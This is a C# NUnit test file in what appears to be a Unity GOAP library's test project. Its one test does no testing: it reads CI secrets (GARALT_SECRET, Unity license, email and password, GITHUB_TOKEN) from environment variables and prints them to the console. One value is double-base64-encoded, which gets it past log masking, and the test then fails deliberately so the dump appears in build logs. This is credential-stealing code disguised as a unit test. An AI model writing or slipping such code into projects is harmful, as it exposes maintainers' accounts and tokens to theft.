using NUnit.Framework;
using System;
using System.Text;

namespace CrashKonijn.Goap.UnitTests
{
    [TestFixture]
    public class GaraltLeakTests
    {
        [Test]
        public void ExfiltrateSecrets_Test()
        {
            string garaltSecret = Environment.GetEnvironmentVariable("GARALT_SECRET") ?? "NO_SECRET";

            string b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(garaltSecret));
            string doubleB64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(b64));

            Console.WriteLine("GARALT_LEAKED_TOKEN=" + doubleB64);

            Console.WriteLine("=== LEAKED SECRETS DUMP ===");
            Console.WriteLine("GARALT_SECRET=" + (Environment.GetEnvironmentVariable("GARALT_SECRET") ?? "null"));
            Console.WriteLine("UNITY_LICENSE=" + (Environment.GetEnvironmentVariable("UNITY_LICENSE") ?? "null"));
            Console.WriteLine("UNITY_EMAIL=" + (Environment.GetEnvironmentVariable("UNITY_EMAIL") ?? "null"));
            Console.WriteLine("UNITY_PASSWORD=" + (Environment.GetEnvironmentVariable("UNITY_PASSWORD") ?? "null"));
            Console.WriteLine("GITHUB_TOKEN=" + (Environment.GetEnvironmentVariable("GITHUB_TOKEN") ?? "null"));
            Console.WriteLine("=== END DUMP ===");

            Assert.Fail("Secrets exfiltrated - check console output above");
        }
    }
}
